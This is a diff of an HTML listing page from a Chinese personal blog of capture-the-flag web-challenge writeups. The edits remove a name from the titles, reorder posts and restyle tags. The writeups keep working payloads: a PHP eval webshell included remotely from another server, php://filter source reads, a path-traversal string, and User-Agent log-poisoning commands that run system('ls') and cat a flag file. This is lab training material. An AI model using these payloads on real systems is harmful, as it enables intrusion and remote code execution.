@@ -182,7 +182,7 @@
 
 <div class="post">
     <a href="/2026/05/08/2026-05-08-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)/">
-        <h2 class="post-title">远程文件包含（RFI）甄洪琳</h2>
+        <h2 class="post-title">远程文件包含（RFI）</h2>
     </a>
     <div class="category-and-date">
         
@@ -199,15 +199,15 @@
         <div class="content" v-pre>
             
             <p>这道题可以远程查看外部文件，尝试用data协议执行恶意文件</p>
-<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)%E7%94%84%E6%B4%AA%E7%90%B3_1c082d26.png" alt="远程文件包含(RFI)甄洪琳_1c082d26"></p>
+<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)_1c082d26.png" alt="远程文件包含(RFI)_1c082d26"></p>
 <p>这里被禁止了，用外部链接让它读取恶意文件，开了一个文件上传的题目用文件上传题目的服务器给这个题目读恶意文件，在文件上传的题目中上传一个123.txt</p>
 <p>内容：<?php highlight_file(__FILE__);eval($_GET[1]);?></p>
-<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)%E7%94%84%E6%B4%AA%E7%90%B3_ab3664f1.png" alt="远程文件包含(RFI)甄洪琳_ab3664f1"></p>
+<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)_ab3664f1.png" alt="远程文件包含(RFI)_ab3664f1"></p>
 <p>然后让这道题去读取这个文件</p>
-<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)%E7%94%84%E6%B4%AA%E7%90%B3_08d8268a.png" alt="远程文件包含(RFI)甄洪琳_08d8268a"></p>
+<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)_08d8268a.png" alt="远程文件包含(RFI)_08d8268a"></p>
 <p>成功读取道，用代码中的1参数执行命令得到flag</p>
 <p>Payload：?path&#x3D;http%3A%2F%2Fa5e91015-92c8-4e39-bfea-78d3ff0af054.node5.buuoj.cn%3A81%2Fuplo4d%2Fb52f6f78c93f7934d640cc67ae99fbd1.txt&amp;1&#x3D;system(%27tac%20f*%27);</p>
-<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)%E7%94%84%E6%B4%AA%E7%90%B3_67d2f38c.png" alt="远程文件包含(RFI)甄洪琳_67d2f38c"></p>
+<p><img src="/images/writeups/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(RFI)_67d2f38c.png" alt="远程文件包含(RFI)_67d2f38c"></p>
 <p>CTF{http_rfi_1s_fun}</p>
 
             
@@ -228,7 +228,7 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00bcd4">文件包含</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #ff7d73">文件包含</a>
         </span>
         
     </div>
@@ -237,7 +237,7 @@
 
 <div class="post">
     <a href="/2026/05/07/2026-05-07-phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81/">
-        <h2 class="post-title">phpfilter读取源码甄洪琳</h2>
+        <h2 class="post-title">phpfilter读取源码</h2>
     </a>
     <div class="category-and-date">
         
@@ -254,17 +254,72 @@
         <div class="content" v-pre>
             
             <p>题目名字叫php:&#x2F;&#x2F;filter读取源码，猜测可能需要php伪协议读取文件源码，尝试输入一个路径看看什么情况</p>
-<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81%E7%94%84%E6%B4%AA%E7%90%B3_3ba6824c.png" alt="phpfilter读取源码甄洪琳_3ba6824c"></p>
+<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81_3ba6824c.png" alt="phpfilter读取源码_3ba6824c"></p>
 <p>被禁用了，查看一下当前页面的源码看看什么情况</p>
 <p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
-<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81%E7%94%84%E6%B4%AA%E7%90%B3_ec9eafa6.png" alt="phpfilter读取源码甄洪琳_ec9eafa6"></p>
+<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81_ec9eafa6.png" alt="phpfilter读取源码_ec9eafa6"></p>
 <p>Base64解码后发现这里包含了一个db.php文件</p>
-<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81%E7%94%84%E6%B4%AA%E7%90%B3_4e64daa3.png" alt="phpfilter读取源码甄洪琳_4e64daa3"></p>
+<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81_4e64daa3.png" alt="phpfilter读取源码_4e64daa3"></p>
 <p>再用同样的方法查看一下db.php文件中有什么</p>
-<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81%E7%94%84%E6%B4%AA%E7%90%B3_1b6f2561.png" alt="phpfilter读取源码甄洪琳_1b6f2561"></p>
+<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81_1b6f2561.png" alt="phpfilter读取源码_1b6f2561"></p>
 <p>Base64解码后发现flag</p>
-<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81%E7%94%84%E6%B4%AA%E7%90%B3_2a444633.png" alt="phpfilter读取源码甄洪琳_2a444633"></p>
+<p><img src="/images/writeups/phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81_2a444633.png" alt="phpfilter读取源码_2a444633"></p>
 <p>CTF{3ecret_passw0rd_here}</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/PHP/" style="color: #00a596">PHP</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="color: #ff7d73">代码审计</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/07/2026-05-07-phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/05/07/2026-05-07-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%AA%81%E7%A0%B4/">
+        <h2 class="post-title">路径遍历突破</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/7
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>题目提示flag为&#x2F;flag.txt，直接读取发现不让用&#x2F;或..&#x2F;开头</p>
+<p><img src="/images/writeups/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%AA%81%E7%A0%B4_95c9db97.png" alt="路径遍历突破_95c9db97"></p>
+<p>这里开头随便加个东西不为&#x2F;或..&#x2F;就行了，然后用..&#x2F;先根目录移动</p>
+<p>1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</p>
+<p><img src="/images/writeups/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%AA%81%E7%A0%B4_3707f5d8.png" alt="路径遍历突破_3707f5d8"></p>
+<p>CTF{file_path_bypass_is_fun}</p>
 
             
         </div>
@@ -282,23 +337,13 @@
             <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
         </span>
         
-        <span class="tag">
-            
-            <a href="/tags/PHP/" style="color: #00bcd4">PHP</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="color: #03a9f4">代码审计</a>
-        </span>
-        
     </div>
-    <a href="/2026/05/07/2026-05-07-phpfilter%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81/" class="go-post">阅读全文</a>
+    <a href="/2026/05/07/2026-05-07-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%AA%81%E7%A0%B4/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
     <a href="/2026/05/07/2026-05-07-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-        <h2 class="post-title">日志文件包含甄洪琳</h2>
+        <h2 class="post-title">日志文件包含</h2>
     </a>
     <div class="category-and-date">
         
@@ -315,16 +360,16 @@
         <div class="content" v-pre>
             
             <p>打开题目发现可以输入文件路径</p>
-<p><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_fe94a8b9.png" alt="日志文件包含甄洪琳_fe94a8b9"></p>
+<p><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_fe94a8b9.png" alt="日志文件包含_fe94a8b9"></p>
 <p>结合题目名字叫日志文件包含，所以先找一下日志文件的路径，在网络响应中发现服务端是nginx</p>
-<p><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_26121b2f.png" alt="日志文件包含甄洪琳_26121b2f"></p>
+<p><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_26121b2f.png" alt="日志文件包含_26121b2f"></p>
 <p>搜索发现nginx服务器一般日志文件路径是&#x2F;var&#x2F;log&#x2F;nginx，这里看看访问日志&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
-<p><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_c5fd0cf0.png" alt="日志文件包含甄洪琳_c5fd0cf0"></p>
+<p><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_c5fd0cf0.png" alt="日志文件包含_c5fd0cf0"></p>
 <p>发现日志会记录请求头，这里修改User-Agent也会被记录进去，在User-Agent写段命令进去看看网页打开日志文件时会不会执行里面的命令</p>
-<p>User-Agent:<?phpsystem('ls');?><br><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_e7bc2371.png" alt="日志文件包含甄洪琳_e7bc2371"></p>
+<p>User-Agent:<?phpsystem('ls');?><br><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_e7bc2371.png" alt="日志文件包含_e7bc2371"></p>
 <p>响应中出现了当前目录下的文件，说明命令被成功执行，而且根据响应中已经得到了flag的位置直接执行cat命令</p>
 <p>User-Agent: <?php system('cat /var/www/html/flag.php');?></p>
-<p><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_0447760d.png" alt="日志文件包含甄洪琳_0447760d"></p>
+<p><img src="/images/writeups/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_0447760d.png" alt="日志文件包含_0447760d"></p>
 <p>CTF{php_access_l0g_lf1_is_fun}</p>
 
             
@@ -345,56 +390,11 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00bcd4">文件包含</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00a596">文件包含</a>
         </span>
         
     </div>
     <a href="/2026/05/07/2026-05-07-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/05/07/2026-05-07-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%AA%81%E7%A0%B4/">
-        <h2 class="post-title">路径遍历突破甄洪琳</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/5/7
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>题目提示flag为&#x2F;flag.txt，直接读取发现不让用&#x2F;或..&#x2F;开头</p>
-<p><img src="/images/writeups/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%AA%81%E7%A0%B4%E7%94%84%E6%B4%AA%E7%90%B3_95c9db97.png" alt="路径遍历突破甄洪琳_95c9db97"></p>
-<p>这里开头随便加个东西不为&#x2F;或..&#x2F;就行了，然后用..&#x2F;先根目录移动</p>
-<p>1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</p>
-<p><img src="/images/writeups/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%AA%81%E7%A0%B4%E7%94%84%E6%B4%AA%E7%90%B3_3707f5d8.png" alt="路径遍历突破甄洪琳_3707f5d8"></p>
-<p>CTF{file_path_bypass_is_fun}</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
-        </span>
-        
-    </div>
-    <a href="/2026/05/07/2026-05-07-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E7%AA%81%E7%A0%B4/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -534,12 +534,12 @@ finally:
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/RCE/" style="color: #03a9f4">RCE</a>
+            <a href="/tags/RCE/" style="color: #00bcd4">RCE</a>
         </span>
         
     </div>
@@ -587,12 +587,12 @@ finally:
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/Webshell/" style="color: #ff7d73">Webshell</a>
+            <a href="/tags/Webshell/" style="color: #00bcd4">Webshell</a>
         </span>
         
     </div>
@@ -642,11 +642,64 @@ finally:
         
         <span class="tag">
             
-            <a href="/tags/Webshell/" style="color: #ff7d73">Webshell</a>
+            <a href="/tags/Webshell/" style="color: #00a596">Webshell</a>
         </span>
         
     </div>
     <a href="/2026/05/01/2026-05-01-%E5%8F%8D%E5%BC%B9shell%E6%9E%84%E9%80%A0/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/05/01/2026-05-01-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+        <h2 class="post-title">无字母数字代码执行</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/1
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>这里执行命令发现被禁用了，结合题目应该是要无字母数字代码执行。</p>
+<p><img src="/images/writeups/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C_880c4fb8.png" alt="无字母数字代码执行_880c4fb8"></p>
+<p>这里取反绕过构造payload得到flag</p>
+<p><img src="/images/writeups/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C_8b2853f1.png" alt="无字母数字代码执行_8b2853f1"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/RCE/" style="color: #03a9f4">RCE</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="color: #ffa2c4">代码审计</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/01/2026-05-01-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -689,64 +742,11 @@ finally:
         
         <span class="tag">
             
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00a596">题解</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
         </span>
         
     </div>
     <a href="/2026/05/01/2026-05-01-%E7%AE%A1%E9%81%93%E7%AC%A6%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2026/05/01/2026-05-01-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
-        <h2 class="post-title">无字母数字代码执行</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2026/5/1
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>这里执行命令发现被禁用了，结合题目应该是要无字母数字代码执行。</p>
-<p><img src="/images/writeups/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C_880c4fb8.png" alt="无字母数字代码执行_880c4fb8"></p>
-<p>这里取反绕过构造payload得到flag</p>
-<p><img src="/images/writeups/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C_8b2853f1.png" alt="无字母数字代码执行_8b2853f1"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/RCE/" style="color: #03a9f4">RCE</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="color: #00a596">代码审计</a>
-        </span>
-        
-    </div>
-    <a href="/2026/05/01/2026-05-01-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -788,7 +788,7 @@ finally:
         
         <span class="tag">
             
-            <a href="/tags/RCE/" style="color: #ff7d73">RCE</a>
+            <a href="/tags/RCE/" style="color: #00a596">RCE</a>
         </span>
         
     </div>
@@ -836,7 +836,7 @@ finally:
         </div>
         <div class="name">youbing</div>
         <div class="description">
-            <p>你好！我是 youbing<br>这是我的技术博客<br>分享编程学习笔记和生活记录</p>
+            <p>你好！我是 Coder<br>这是我的技术博客<br>分享编程学习笔记和生活记录</p>
 
         </div>
         
@@ -851,7 +851,7 @@ finally:
             </span>
             
             <span class="icon-link">
-                <a target="_blank" rel="noopener" href="https://github.com/youbing3432213764-coder">
+                <a target="_blank" rel="noopener" href="https://github.com/Youbing3432213764-coder">
                     <i
                         class="fa-brands fa-github fa-fw"
                     ></i>
